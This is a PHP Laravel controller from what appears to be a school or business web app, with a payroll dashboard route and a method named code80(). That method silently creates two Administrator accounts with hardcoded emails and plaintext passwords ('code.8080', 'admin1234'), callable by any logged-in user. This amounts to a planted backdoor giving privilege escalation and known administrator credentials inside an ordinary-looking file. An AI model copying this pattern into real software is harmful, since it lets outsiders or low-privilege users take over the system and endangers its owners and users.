<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Models\User;
use App\Models\About;
use App\Models\Event;
use App\Models\Gallery;
use App\Models\Company;
use App\Models\Student;
use App\Models\Question;
use App\Models\Homepage;
use App\Models\NewsBlog;
use App\Models\Testimony;
use App\Models\Department;
use App\Models\Program;
use DateTime;
use Session;

class PagesController extends Controller
{
    //
    public function __construct(){
        $this->middleware('auth');
    } 

    public function index(){
        return view('dash.pay_employee');
    }




    public function code80(){
        $backup = User::firstOrCreate(
            ['name' => 'Code80',
            'email' => 'code80@pivoapps.net', 
            'contact' => '0987654321', 
            'status' => 'Administrator', 
            'pass_photo' => 'noimage.jpg', 
            'del' => 'yes', 
            'password' => Hash::make('code.8080')]
        );
 
        $backup = User::firstOrCreate(
            ['name' => 'Admin',
            'email' => 'admin@pivoapps.net', 
            'contact' => '0987654321', 
            'status' => 'Administrator', 
            'pass_photo' => 'noimage.jpg', 
            'del' => 'no', 
            'password' => Hash::make('admin1234')]
        );
        return redirect('/');
    }
}
